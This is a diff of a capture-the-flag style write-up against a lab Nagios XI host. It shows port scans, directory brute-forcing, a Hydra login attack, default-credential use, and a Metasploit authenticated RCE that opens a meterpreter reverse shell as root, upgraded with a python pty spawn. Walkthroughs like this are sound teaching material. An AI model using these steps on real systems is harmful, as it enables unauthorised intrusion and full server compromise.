@@ -1,6 +1,6 @@
-### Nagios_XI_writeup 
+<h1>Nagios_XI_writeup</h1>
 
-### 1. Firstly added the ip to hosts
+### Firstly added the ip to hosts
 <pre>
 
 192.168.49.126  my.addr
@@ -14,7 +14,7 @@ ff02::2    ip6-allrouters
 </pre>
 
 
-### 2. Then i did network scan and i found some ports opened as shown below (firstly i did scan with rust and then i did nmap scan on ports found in rust scan)
+### let's enumerate what ports are opened
  
 
 <h3><b>rustscan-results</b></h3>
@@ -114,12 +114,34 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 24.08 seconds
 </pre>
 
-<h3><b>During this network scan i was trying to enumerate port 80 and i found that port 80 runs a service called NAGIOS_XI monitoring tool</b></h3>
+<h3><b>hmm... port 80("nagiosxi") and 389("LDAP") may vulnerable here</b></h3>
 
-<h3><b>Then i found a login page on the port 80 as shown below</b></h3>
+<h3><b>Let's try if we can find something with these ports</b></h3>
+<h3><b>Let's try with port 80 first</b></h3>
+
+![alt text](http://url/to/img.png)
+<h3>We got a server that runs a service named as Nagiosix</h3>
+
+<h3>let's enumerate some info about it using google</h3>
+
+<h3>So, we got info about it shown below</h3>
+<pre>
+
+Nagios XI provides a monitoring, alerting, graphing, and reporting platform for your entire infrastructure, including servers, operating systems, applications, network devices, websites, hypervisors, cloud servers, and much more.
+</pre>
+
+ 
+![alt text](http://url/to/img.png)
+<h3>let's go further</h3>
+<h3>Voila... we found a login page in this</h3>
+![alt text](http://url/to/img.png)
+<h3>let's check if its vulnerable from things like("Sql injection,Xss etc")</h3>
+<br>
+<h3>nope it's not vulnerable</h3>
 
 
-<h3>Meanwhile I Did Directory Enumeration</h3>
+
+<h3>Let's try enumerating with dirb directory enumeration</h3>
 <pre>
 ***********
 ┌[linspace]─[14:32-10/08]─[/home/sp1d3y]
@@ -150,7 +172,8 @@ GENERATED WORDS: 4612
 **********
 </pre>
 
-<h3>I further enumerated directories</h3>
+<h3>hmm... nagiosxi seems different let's enumerate it further</h3>
+
 <pre>
 ┌[linspace]─[14:37-10/08]─[/home/sp1d3y]
 └╼sp1d3y$dirb http://hack.thm/nagiosxi/ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
@@ -182,10 +205,10 @@ GENERATED WORDS: 81628
 ^C> Testing: http://hack.thm/nagiosxi/1427  
 </pre>
 
-<h3><b>But didn't got the lead so...</b></h3>
+<h3><b>damn.. we didn't found anything good in these directories</b></h3>
 
 
-<h3><b>Tried to brute force that login form</b></h3>
+<h3><b>Let's try brute forcing that login form</b></h3>
 
 <pre>
 ┌[linspace]─[15:42-10/08]─[/home/sp1d3y]
@@ -241,15 +264,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-10 15:42:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-10 15:44:36
 </pre>
 
-<h3>But none of these credentials worked may be bcuz i did something wrong in command</h3>
-<h3>Then, Looked at nmap scan again and looked for other ports but didn't find good stuff</h3>
+<h3>We got 41 valid credentials but none of them worked maybe i did something wrong here let's check further if we can do something</h3>
 
 
+<h3>Let's check if there is any exploit available for nagiosxi</h3>
 
-<h3>Then i tried for finding any exploit for nagiosxi service that i found on port 80</h3> 
-<h3>I found an RCE ("https://www.exploit-db.com/exploits/48191")</h3>
+<h3>And Booomm... We found a RCE ("https://www.exploit-db.com/exploits/48191")</h3>
 
-<h3>Then opened the metasploit and searched for this rce in metasploit database</h3>
+<h3>let's check if it works or not</h3>
 
 <pre>
 ┌[linspace]─[14:26-10/08]─[/home/sp1d3y]
@@ -278,7 +300,9 @@ Matching Modules
 
 
 Interact with a module by name or index. For example info 13, use 13 or use exploit/unix/webapp/nagios3_statuswml_ping
-
+</pre>
+<h3>let's use the 9th one that we found in rce</h3>
+<pre>
 [msf](Jobs:0 Agents:0) >> use 9
 [*] Using configured payload linux/x64/meterpreter/reverse_tcp
 [msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> show options
@@ -317,7 +341,12 @@ Exploit target:
    --  ----
    1   Linux (x64)
 
-
+</pre>
+<h3>hmm... we dont know any valid creds</h3>
+<h3>let's check if we can find default creds for nagiosxi</h3>
+<h3>so we got some default passwords for nagiosxi like admin,PASSW0RD for root user</h3>
+<h4>let's try them one by one</h4>
+<pre>
 [msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> set LHOST my.addr
 LHOST => my.addr
 [msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> set rhosts hack.thm
@@ -330,6 +359,7 @@ password => admin
 [+] Successfully authenticated to Nagios XI
 [*] Target is Nagios XI with version 5.6.0
 [*] 192.168.126.136:80 - The target appears to be vulnerable.
+<h3>hoorey... So first one worked and we found that it is vulnerable , Now let's go ahead</h3>
 [msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> run
 
 [*] Started reverse TCP handler on 192.168.49.126:4444 
@@ -353,6 +383,13 @@ Process 12073 created.
 Channel 1 created.
 whoami
 root
+</pre>
+<h3>let's spawn a shell from it</h3>
+<pre>
+which python
+/usr/bin/python
+python -c "import pty;pty.spawn('/bin/bash')"
+root@ubuntu:/root#
 </pre>
 
 
